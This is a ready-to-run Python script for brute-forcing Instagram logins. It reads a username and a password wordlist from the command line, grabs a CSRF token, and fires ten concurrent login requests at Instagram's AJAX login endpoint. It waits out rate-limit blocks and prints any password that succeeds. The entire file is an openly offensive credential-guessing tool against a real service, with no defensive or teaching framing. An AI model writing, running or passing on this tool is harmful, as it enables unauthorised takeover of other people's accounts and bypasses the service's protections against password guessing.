#!/bin/python
import time
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

WAIT_TIME = (11 * 60 + 35)  # 11 mins and 35 seconds
PROBLEM_LOGGING_IN = "There was a problem logging you into Instagram. Please try again soon."

def log_in_success(response):
    return "logged-in" in response.text

def brute_force_login_single(password):
    account_username = brute_force_login_single.username
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    session = requests.Session()

    try:
        # Perform login request
        response = session.get('https://www.instagram.com')
        csrf_token = response.cookies['csrftoken']

        payload = {
            'username': account_username,
            'password': password,
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        headers = {
            'X-CSRFToken': csrf_token,
            'Referer': 'https://www.instagram.com/accounts/login/',
        }

        response = session.post(login_url, data=payload, headers=headers)

        if response.status_code == 200 and log_in_success(response):
            return password

        if response.status_code == 403 and PROBLEM_LOGGING_IN in response.text:
            time.sleep(WAIT_TIME)

    except Exception as e:
        print(f"Exception: {e}")

    return None

def brute_force_login(account_username, password_list):
    brute_force_login_single.username = account_username
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(brute_force_login_single, password): password for password in password_list}
        for future in as_completed(futures):
            password = futures[future]
            print(f"[+] Trying password: {password}")
            result = future.result()
            if result:
                return result

    return None

def read_wordlist_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"Error reading wordlist file: {e}")
    return []


def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <username> <wordlist_file>")
        return

    account_username = sys.argv[1]
    wordlist_path = sys.argv[2]
    print(f"Brute forcing for username: {account_username}")

    password_list = read_wordlist_file(wordlist_path)

    if not password_list:
        print("Unable to read wordlist file.")
        return

    result = brute_force_login(account_username, password_list)

    if result:
        print(f"Password found for username {account_username}: {result}")
    else:
        print("Unable to find correct password.")

if __name__ == "__main__":
    main()
